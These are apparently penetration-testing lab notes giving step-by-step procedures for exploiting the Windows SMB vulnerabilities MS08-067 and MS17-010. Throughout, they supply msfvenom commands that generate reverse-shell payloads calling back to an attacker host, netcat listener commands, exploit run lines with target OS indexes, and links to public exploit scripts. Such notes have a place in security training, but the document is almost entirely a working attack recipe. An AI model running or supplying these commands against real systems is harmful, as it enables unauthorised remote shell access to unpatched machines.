
########################
MS-08-067
########################
1. Download https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
2. Generate shellcode: msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.90 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
3. Replace the shellcode in the downloaded script with the generated shellcode
4. Now you have to know the exact target OS based on following table:
   Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
   Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
   Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
   Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
   Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
   Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
   Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
   Note: Following nmap script might help: nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery <ipaddress>
5. Open netcat listener:  
   nc -lnvp 4444
6. Run exploit: (in this case with OS index "6" which is windows XP SP3 english (NX))
   python ms08-067.py 10.11.1.15 6 445

Once you use the correct OS index, you should get a callback in the netcat listener window with a windows shell

########################
MS-17-010
########################
Source: https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
1. clone git: https://github.com/helviojunior/MS17-010
2. msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.90 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.11.0.90_4444.exe
3. start listener on kali: nc -lnvp 4444
4. start attack: python send_and_execute.py <targetip> rev_10.11.0.90_4444.exe

Note: You also need one more pre-req for the exploit. Get mysmb.py from  https://github.com/worawit/MS17-010/blob/master/mysmb.py save to the same directory as the exploit. If not when running the exploit youâ€™ll encounter: 
ImportError: No module named mysmb